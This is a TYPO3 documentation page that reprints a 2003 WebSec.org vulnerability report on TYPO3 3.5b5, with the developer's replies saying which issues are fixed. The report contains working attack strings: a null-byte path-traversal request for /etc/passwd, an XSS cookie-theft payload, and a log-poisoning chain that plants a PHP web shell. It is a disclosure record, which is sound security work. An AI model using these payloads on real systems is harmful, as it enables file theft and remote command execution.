.. ==================================================
.. FOR YOUR INFORMATION
.. --------------------------------------------------
.. -*- coding: utf-8 -*- with BOM.

.. include:: ../../../Includes.txt


Security reports
^^^^^^^^^^^^^^^^


www.WebSec.org security report on TYPO3 3.5b5, january 2003
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

January 2002 Martin Eiszner from WebSec.org informed us of a list of
security problems in TYPO3 version 3.5b5. The issues were corrected in
version 3.5.0.

The report is posted here with permission from Martin Eiszner with
Kasper Skårhøjs comments in red. ::

   >2002@WebSec.org/Martin Eiszner
   >
   >=====================
   >Security REPORT TYPO3
   >=====================
   >
   >
   >Product: Typo3 (Version 3.5b5 / Earlier versions are possibly vulnerable
   >too)
   >
   >Vendor: Typo3 (http://www.typo3.com)
   >Vendor-Status: kasper@typo3.com informed
   >Vendor-Patch: ---
   >
   >Local: NO
   >Remote: YES
   >
   >Vulnerabilities:
   >-path-disclosure
   >-proof of file-existense
   >-arbitrary file retrieval
   >-arbitrary command execution
   >-CrossSiteScripting / privilege escalation / cookie-theft
   >-install/config files and scripts within webroot
   >
   >Severity: MEDIUM to HIGH
   >
   >Tested Plattforms: Linux / Slackware i686 / Apache 1.3.23 / PHP 4.1.2
   >
   >
   >============
   >Introduction
   >============
   >
   >removed/vendor
   >
   >
   >=====================
   >Vulnerability Details
   >=====================
   >
   >
   >0) CLIENT-SIDE DATA-OBFUSCATION
   >
   >form-fields are obfuscated using client-side java-script routines.
   >after the fields are joined a java-script creates MD5-hashes and
   >submits the form.
   >
   >examples: index.php (account-data), showpic.php(name-checksum)
   >
   >attached perl-scripts (typo.pl/showpic.pl) demonstrate how to circumvent
   >this protection.
   >

   index.php:
   The point of the MD5 hashing of passwords is to not transmit the password
   in cleartext. That is working as it should: For each login a new random
   hash is used to "encrypt" the sending of the password. This means that the
   "userident" string is never the same even though the same password is sent.
   Your proof-of-concept script only emulates the login-form allowing for making
   looped login-attempts. Isn't that correct? Pls. comment.
   NOT FIXED - It works as intended and higher security must - as far as I can
   see - be obtained by application of other external methods in addition. See
    http://typo3.org/doc+M561953c3fc3.0.html

   showpic.php/thumbs.php:
   In these scripts the point of MD5-hashes is simply to make it hard for people
    to spontaneously change a parameter to the script. This is made difficult
   because you'll need computing of the MD5-hash. So this is not meant to be
   totally impossible, but just plain hard preventing casual users from trying.
   FIX: I have included a server-known key in the MD5 hash so
   it can't be reconstructed.




   >1) PATH-DISCLOSURE
   >
   >several test-, class- and library-scripts can be found within webroot.
   >some of them can be forced to produce runtime errors and output their
   >physical path.
   >
   >example: /fileadmin/include_test.php

   This script exists only with the testsite. This script is therefore not
   a part of the TYPO3 source code and the responsibility to remove this
   script - and further make sure that such scripts does not in general
   exist! - lies on the developer/implementator of a TYPO3 solution.
   NOT FIXED - the testsite-package will still ship with this script since
   it's not a part of the TYPO3 source code as such. Users of the
   testsite-package are responsible of removing this script themselves if
   it disturbs them.


   >2) PROOF OF FILE-EXISTENZ
   >
   >"showpic.php" and "thumbs.php" allow an attacker to check the existense of
   >arbitrary files.
   >
   >combined with file-enumeration methods it is possible to reconstruct parts
   >of the directory- and filesystem - structure.
   >
   >example on howto check for existing files with attached perl-script
   >"showpic.pl":
   >---*---
   >sh> showpic.pl localhost '../../../../../../../../../../etc/hosts'
   >../../../../../../../../../../etc/hosts exists
   >---*---


   FIXED.


   >3) CROSS SITE SCRIPTING / COOKIE-THEFT
   >
   >all system and login-errors are saved in the typo3-database.
   >administrators can view all the erroneous data.
   >
   >since this data is not being checked for XSS-content it is possible to
   >include
   >client-side script(java-script)-tags in these entries.
   >
   >every time the admins view their logs these scripts will be run on the
   >admins
   >web-browser which leads to a typical XSS-bug.
   >
   >thus making it possible to steal the admins-cookies or let him open a new
   >user-account wihout his knowledge.
   >
   >example with the attached "typo.pl" - perlscript:
   >
   >---*---
   >sh> typo.pl localhost '><script>alert(document.cookie)</script><:aaa'
   >---*---
   >
   >viewing the logfiles will execute the script.


   FIXED.


   >4) ARBITRARY FILE-RETRIEVAL
   >
   >the "dev/translations.php" - script does not check the
   >ONLY-parameter for malicious values.
   >
   >a relative path combined with a Nullbyte lead to the inclusion of the
   >given file.
   >
   >example http-request:
   >---*---
   >GET
   >http://host/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
   >---*---
   >
   >5) ARBITRARY COMMAND EXECUTION
   >
   >extends vulnerability number 4):
   >
   >if the included file contains php-source code it will be executed.
   >thus allowing an attacker to execute operating-system commands and
   >at long sight escalate his privileges.
   >
   >example:
   >---*---
   >
   >a file for placing our malicious php-source is needed.
   >if there is no file we have write-access we still can use the
   >websevers-logfiles.
   >
   >the following http-request:
   >---cut---
   >http://localhost/<%3f %60echo %27<%3fpassthru(%5c%24c)%3f>%27 >>
   >./x.php%60 %3f>
   >---cut---
   >
   >creates this entry:
   >
   >---cut---
   >[Tue Jan 14 19:42:53 2003] [error] [client 127.0.0.1] File does not exist:
   >/apachepath/apache/htdocs/<? `echo '<?passthru(\$c)?>' >> ./x.php` ?>
   >---cut---
   >
   >in a typicall apache - error_log file.
   >
   >using the method discussed under 4) the following http-request:
   >
   >---cut---
   >http://localhost/typo3/typo3/dev/translations.php?ONLY=relative_apache_path/apache/logs/error_log%00'
   >---cut---
   >
   >will include the apach error_log in our output and execute our
   >php-commands.
   >as a result we will find x.php in our "/dev" directory.
   >
   >x.php:
   >---cut---
   ><?passthru($c)?>
   >---cut---
   >
   >---*---
   >


   4+5 is FIXED.
   NOTE: The dev/ folder contains scripts which are normally disabled by
   a die() function call since they are used in special cases. The dev/
   folder scripts are not considered a real part of the TYPO3 source and
   can be removed without any consequenses if a user wants to.



   >6) SCRIPTS AND DIRECTORIES IN WEBROOT
   >
   >a couple of scripts, libraries, files and directories can be found within
   >typo3s
   >webroot.
   >
   >"/install" is improper protected and vulnerable to brute-force attacks.

   The file install/index.php can be protected by a die() function call.
   Developers are always encouraged to keep the script disabled during the
   long periods where it is not used. However failure to do so may impose
   a security hole. In particular if the default Install Tool Password is
   not changed.
   The security problem regards only careless use and warnings are plentyful
   inside the Install Tool! However if any security holes in the PHP-scripts
   exists that is a more interesting matter. I don't see any.
   Paranoid users can safely remove this directory if they don't need the
   install tool or alternatively insert a .htaccess file if they like.
   NOT FIXED - responsibility is the on the user.

   >"/fileadmin" directory reveals log-files and demo-scripts

   Depends on implementation. The "fileadmin/" directory is at the users
   disposal and not a part of TYPO3's source code.
   True enough, the testsite-package includes both logfiles and scripts there.
   NOT FIXED - responsibility is the on the user.


   >"/typo3conf" directory contains the localconf.php,database.sql and other
   >sensitive files

   localconf.php file is by default placed here. That is correct. The
   directory must also be writeenabled according to TYPO3's requirements
    for a correct installation.
   Paranoid users can always make a reduced localconf.php file which
   includes another "outside-of-webroot" file if they like:

   <?
   include("/outside_of_webroot/real_localconf.php");
   ?>

   As for the sql-file found there it's not a requirement of the source
   code and in this analysis it stems from the testsite-package.
   NOT FIXED - responsibility is on the user.


   >=======
   >Remarks
   >=======
   >
   >the serious vulnerabilities rely on the "/dev" (developer?) - directory.
   >scripts within this directory can be found in many/most
   >production-environments!

   It's officially recommended to just remove this directory then.


   >====================
   >Recommended Hotfixes
   >====================
   >
   >1) remove "/install" directory
   >2) remove "/dev" directory

   OK

   >2) Choose strong administrator-passwords

   Always do. Also see this URL for further security actions you can take:
   http://typo3.org/doc+M561953c3fc3.0.html


   >3) showpic.php and thumbs.php must be patched.

   FIXED.

   >3) remove all demo-directories and protect "/fileadmin" and "/typo3conf"

   Both directories are not part of the TYPO3 source code but relates to
   the specific implementation. Responsibility therefore lies on the
   developers implementation of a site with TYPO3. See above comments for
   advises on these issues.


   >EOF Martin Eiszner / @2002WebSec.org
   >
   >
   >=======
   >Contact
   >=======
   >
   >WebSec.org / Martin Eiszner
   >Gurkgasse 49/Top14
   >1140 Vienna
   >
   >Austria / EUROPE
   >
   >mei@websec.org
   >http://www.websec.org
   >

